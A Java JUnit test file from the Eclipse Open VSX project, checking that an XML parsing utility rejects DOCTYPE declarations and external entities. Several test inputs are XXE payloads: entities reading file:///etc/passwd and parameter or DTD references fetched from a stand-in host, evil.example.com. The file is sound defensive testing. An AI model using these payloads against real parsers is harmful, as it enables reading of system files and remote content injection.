/******************************************************************************
 * Copyright (c) 2026 Contributors to the Eclipse Foundation.
 *
 * See the NOTICE file(s) distributed with this work for additional
 * information regarding copyright ownership.
 *
 * This program and the accompanying materials are made available under the
 * terms of the Eclipse Public License 2.0 which is available at
 * https://www.eclipse.org/legal/epl-2.0.
 *
 * SPDX-License-Identifier: EPL-2.0
 *****************************************************************************/
package org.eclipse.openvsx.util;

import org.junit.jupiter.api.Test;

import static org.assertj.core.api.AssertionsForClassTypes.assertThat;

public class XmlUtilTest {

    @Test
    public void parseSafeXml() {
        var input = """
                <?xml version="1.0" encoding="UTF-8"?>
                <root>
                    <data>test</data>
                </root>
                """;

        var document = XmlUtil.safeParse(input);
        assertThat(document).isNotNull();
        assertThat(document.getDocumentElement()).isNotNull();
    }

    @Test
    void shouldRejectXmlWithInlineDoctypeEntityDeclaration() {
        // Tests the disallow-doctype-decl feature: any DOCTYPE declaration
        // must be rejected to prevent local entity injection
        var input = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE urlset [<!ENTITY secret "sensitive-data">]>
                <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
                </urlset>
                """;

        assertThat(XmlUtil.safeParse(input)).isNull();
    }

    @Test
    public void shouldRejectXmlWithInlineDoctypeEntityDeclaration2() {
        var input = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                <root>
                    <data>&xxe;</data>
                </root>
                """;

        var document = XmlUtil.safeParse(input);
        assertThat(document).isNull();
    }

    @Test
    void shouldRejectXmlWithExternalGeneralEntityReference() {
        // Tests the external-general-entities feature: external system entity
        // references (classic XXE attack vector) must be rejected
        var input = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE urlset [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
                    <url><loc>&xxe;</loc></url>
                </urlset>
                """;

        assertThat(XmlUtil.safeParse(input)).isNull();
    }

    @Test
    void shouldRejectXmlWithExternalParameterEntityReference() {
        // Tests the external-parameter-entities feature: parameter entity
        // references that pull in external content must be rejected
        var input = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE urlset [<!ENTITY % remote SYSTEM "http://evil.example.com/evil.xml"> %remote;]>
                <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
                </urlset>
                """;

        assertThat(XmlUtil.safeParse(input)).isNull();
    }

    @Test
    void shouldRejectXmlWithExternalDtdReference() {
        // Tests the ACCESS_EXTERNAL_DTD attribute: external DTD system
        // identifiers must not be fetched
        var input = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE urlset SYSTEM "http://evil.example.com/evil.dtd">
                <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
                </urlset>
                """;

        assertThat(XmlUtil.safeParse(input)).isNull();
    }
}
